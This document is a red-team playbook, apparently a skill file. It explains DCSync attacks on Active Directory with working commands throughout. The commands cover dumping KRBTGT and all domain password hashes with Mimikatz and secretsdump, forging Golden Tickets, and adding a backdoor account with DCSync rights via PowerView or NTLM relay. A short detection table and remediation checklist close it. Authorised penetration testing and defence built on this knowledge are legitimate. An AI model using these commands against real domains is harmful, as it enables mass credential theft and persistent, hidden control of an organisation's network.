---
name: conducting-domain-persistence-with-dcsync
description: Perform DCSync attacks to replicate Active Directory credentials and establish domain persistence by extracting KRBTGT, Domain Admin, and service account hashes for Golden Ticket creation.
domain: cybersecurity
subdomain: red-teaming
tags: [red-team, active-directory, dcsync, persistence, credential-dumping, golden-ticket, mimikatz]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# Conducting Domain Persistence with DCSync

## Overview

DCSync is an attack technique that abuses the Microsoft Directory Replication Service Remote Protocol (MS-DRSR) to impersonate a Domain Controller and request password data from the target DC. The attack was introduced by Benjamin Delpy (Mimikatz author) and Vincent Le Toux, leveraging the DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights. Any principal (user or computer) with these rights can replicate password hashes for any account in the domain, including the KRBTGT account. With the KRBTGT hash, attackers can forge Golden Tickets for indefinite domain persistence. DCSync is categorized as MITRE ATT&CK T1003.006 and is a critical post-exploitation technique used by APT groups including APT28 (Fancy Bear), APT29 (Cozy Bear), and FIN6.

## Objectives

- Identify accounts with DCSync (replication) rights in Active Directory
- Perform DCSync using Mimikatz or Impacket's secretsdump.py
- Extract the KRBTGT account hash for Golden Ticket creation
- Dump all domain user password hashes for credential analysis
- Forge Golden Tickets for persistent domain access
- Grant DCSync rights to a controlled account for alternative persistence
- Document the attack chain and persistence mechanisms

## MITRE ATT&CK Mapping

- **T1003.006** - OS Credential Dumping: DCSync
- **T1558.001** - Steal or Forge Kerberos Tickets: Golden Ticket
- **T1222.001** - File and Directory Permissions Modification: Windows
- **T1098** - Account Manipulation
- **T1078.002** - Valid Accounts: Domain Accounts

## Implementation Steps

### Phase 1: Identify Accounts with DCSync Rights
1. Enumerate principals with replication rights:
   ```powershell
   # Using PowerView
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { ($_.ObjectAceType -match 'Replicating') -and
                    ($_.ActiveDirectoryRights -match 'ExtendedRight') } |
     Select-Object SecurityIdentifier, ObjectAceType

   # Using BloodHound Cypher query
   MATCH (u)-[:DCSync|GetChanges|GetChangesAll*1..]->(d:Domain)
   RETURN u.name, d.name
   ```
2. Using Impacket's FindDelegation or custom LDAP query:
   ```bash
   # Check with Impacket
   findDelegation.py domain.local/user:'Password123' -dc-ip 10.10.10.1
   ```
3. Default accounts with DCSync rights:
   - Domain Admins
   - Enterprise Admins
   - Domain Controllers group
   - SYSTEM on Domain Controllers

### Phase 2: DCSync Credential Extraction
1. Using Mimikatz (Windows):
   ```powershell
   # Dump specific account (KRBTGT for Golden Ticket)
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:krbtgt"

   # Dump Domain Admin
   mimikatz.exe "lsadump::dcsync /domain:domain.local /user:administrator"

   # Dump all domain accounts
   mimikatz.exe "lsadump::dcsync /domain:domain.local /all /csv"
   ```
2. Using Impacket secretsdump.py (Linux):
   ```bash
   # Dump all credentials
   secretsdump.py domain.local/admin:'Password123'@10.10.10.1

   # Dump specific user
   secretsdump.py -just-dc-user krbtgt domain.local/admin:'Password123'@10.10.10.1

   # Dump only NTLM hashes (no Kerberos keys)
   secretsdump.py -just-dc-ntlm domain.local/admin:'Password123'@10.10.10.1

   # Using Kerberos authentication
   export KRB5CCNAME=admin.ccache
   secretsdump.py -k -no-pass domain.local/admin@DC01.domain.local
   ```

### Phase 3: Golden Ticket Creation
1. Using Mimikatz with extracted KRBTGT hash:
   ```powershell
   # Create Golden Ticket
   mimikatz.exe "kerberos::golden /user:administrator /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> /ptt"

   # Create with specific group memberships
   mimikatz.exe "kerberos::golden /user:fakeadmin /domain:domain.local \
     /sid:S-1-5-21-XXXXXXXXXX \
     /krbtgt:<krbtgt_ntlm_hash> \
     /groups:512,513,518,519,520 /ptt"
   ```
2. Using Impacket ticketer.py (Linux):
   ```bash
   # Create Golden Ticket
   ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid S-1-5-21-XXXXXXXXXX \
     -domain domain.local administrator

   # Use the ticket
   export KRB5CCNAME=administrator.ccache
   psexec.py -k -no-pass domain.local/administrator@DC01.domain.local
   ```

### Phase 4: Persistence via DCSync Rights
1. Grant DCSync rights to a controlled account for persistence:
   ```powershell
   # Using PowerView - Add DS-Replication-Get-Changes-All rights
   Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
     -PrincipalIdentity backdoor_user -Rights DCSync

   # Verify rights were added
   Get-DomainObjectAcl -SearchBase "DC=domain,DC=local" -ResolveGUIDs |
     Where-Object { $_.SecurityIdentifier -match "backdoor_user_SID" }
   ```
2. Using ntlmrelayx.py for automated DCSync rights escalation:
   ```bash
   # Relay authentication to add DCSync rights
   ntlmrelayx.py -t ldap://DC01.domain.local --escalate-user backdoor_user
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| Mimikatz | DCSync extraction, Golden Ticket creation | Windows |
| secretsdump.py | Remote DCSync (Impacket) | Linux (Python) |
| ticketer.py | Golden Ticket creation (Impacket) | Linux (Python) |
| PowerView | ACL enumeration and modification | Windows (PowerShell) |
| Rubeus | Kerberos ticket manipulation | Windows (.NET) |
| ntlmrelayx.py | DCSync rights escalation via relay | Linux (Python) |

## Critical Hashes to Extract

| Account | Purpose | Persistence Value |
|---------|---------|-------------------|
| krbtgt | Golden Ticket creation | Indefinite domain access |
| Administrator | Direct DA access | Immediate privileged access |
| Service accounts | Lateral movement | Service access across domain |
| Computer accounts | Silver Ticket creation | Service-level impersonation |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| DrsGetNCChanges RPC calls from non-DC sources | Network monitoring for DRSUAPI traffic from unusual IPs |
| Event 4662 with Replicating Directory Changes GUIDs | Windows Security Log on DC (1131f6aa-/1131f6ad- GUIDs) |
| Event 4624 with Golden Ticket anomalies | Logon events with impossible SIDs or non-existent users |
| ACL modifications on domain root object | Event 5136 (directory service changes) |
| Replication traffic volume spike | Network baseline deviation monitoring |

## Validation Criteria

- [ ] Accounts with DCSync rights enumerated
- [ ] KRBTGT hash extracted via DCSync
- [ ] All domain credentials dumped successfully
- [ ] Golden Ticket forged and validated for DA access
- [ ] DCSync rights persistence mechanism established (if in scope)
- [ ] Access to Domain Controller validated with Golden Ticket
- [ ] Evidence documented with hash values and timestamps
- [ ] Remediation recommendations provided (double KRBTGT reset, ACL audit)
